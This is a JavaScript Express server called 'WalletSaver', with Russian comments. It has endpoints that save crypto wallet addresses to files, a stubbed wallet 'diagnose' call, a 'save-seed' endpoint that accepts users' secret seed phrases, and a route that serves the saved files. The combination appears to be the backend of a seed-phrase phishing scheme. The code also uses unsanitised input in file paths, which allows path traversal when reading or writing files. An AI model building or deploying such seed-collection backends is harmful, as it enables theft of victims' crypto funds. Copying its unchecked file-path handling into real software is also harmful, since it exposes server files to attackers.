import express from 'express';
import cors from 'cors';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';


const app = express();
app.use(cors());
const PORT = process.env.PORT || 3002;
app.use(express.json());

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const walletsDir = path.join(__dirname, 'wallets');
if (!fs.existsSync(walletsDir)) {
  fs.mkdirSync(walletsDir);
}

// POST /save-wallet (старый эндпоинт)
app.post('/save-wallet', (req, res) => {
  const { address } = req.body;
  if (!address) {
    return res.status(400).json({ error: 'No wallet address provided' });
  }
  const filePath = path.join(walletsDir, `wallet_${address}.txt`);
  fs.writeFile(filePath, address, err => {
    if (err) {
      return res.status(500).json({ error: 'Failed to save wallet' });
    }
    res.json({ success: true, file: filePath });
  });
});

// POST /api/diagnose (заглушка)
app.post('/api/diagnose', (req, res) => {
  // Здесь должна быть логика диагностики кошелька
  // Для теста возвращаем фиктивный результат
  res.json({ success: true, result: 'Диагностика завершена', data: req.body });
});

// POST /api/save-seed (заглушка)
app.post('/api/save-seed', (req, res) => {
  const { seed } = req.body;
  if (!seed) {
    return res.status(400).json({ error: 'No seed provided' });
  }
  // Сохраняем seed в файл (или просто подтверждаем)
  res.json({ success: true, message: 'Seed сохранён', seed });
});

// GET /wallets/:filename.summary.txt (отдача файлов)
app.get('/wallets/:filename', (req, res) => {
  const { filename } = req.params;
  const filePath = path.join(walletsDir, filename);
  if (!fs.existsSync(filePath)) {
    return res.status(404).send('File not found');
  }
  res.sendFile(filePath);
});

app.listen(PORT, () => {
  console.log(`WalletSaver server running on http://localhost:${PORT}`);
});
